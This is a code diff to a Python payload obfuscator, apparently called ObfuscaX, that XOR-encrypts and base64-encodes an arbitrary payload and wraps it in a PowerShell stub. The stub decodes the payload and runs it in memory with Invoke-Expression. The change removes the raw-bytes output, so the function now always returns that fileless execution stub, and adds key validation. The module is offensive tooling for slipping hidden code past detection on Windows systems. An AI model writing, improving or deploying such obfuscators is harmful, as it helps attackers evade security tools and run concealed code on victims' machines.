@@ -1,16 +1,15 @@
 import base64
-import random
 import logging
+import random
 
 logger = logging.getLogger("ObfuscaX")
 
-def xor_encrypt(data, key):
-    encrypted = bytearray()
-    for b in data:
-        encrypted.append(b ^ key)
-    return encrypted
 
-def dynamic_obfuscate(payload, in_memory=False, xor_key=None):
+def xor_encrypt(data, key):
+    return bytes(b ^ key for b in data)
+
+
+def dynamic_obfuscate(payload, xor_key=None):
     logger.info("Starting dynamic obfuscation...")
 
     if isinstance(payload, str):
@@ -18,12 +17,14 @@ def dynamic_obfuscate(payload, in_memory=False, xor_key=None):
 
     if xor_key is None:
         xor_key = random.randint(1, 255)
+    elif not 1 <= xor_key <= 255:
+        raise ValueError("xor key must be between 1 and 255")
     logger.debug(f"Using XOR key: {xor_key}")
 
     encrypted = xor_encrypt(payload, xor_key)
     b64_encrypted = base64.b64encode(encrypted).decode()
 
-    # PowerShell stub to decode & execute
+    # PowerShell stub to decode and run in memory.
     ps_template = f'''
 $encoded = "{b64_encrypted}"
 $key = {xor_key}
@@ -35,9 +36,5 @@ $decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
 Invoke-Expression $decoded
 '''
 
-    if in_memory:
-        logger.info("Preparing in-memory execution PowerShell payload.")
-        return ps_template.encode()
-    else:
-        logger.info("Returning dynamic obfuscated payload as raw bytes.")
-        return encrypted
+    logger.info("Dynamic obfuscation complete.")
+    return ps_template.encode()
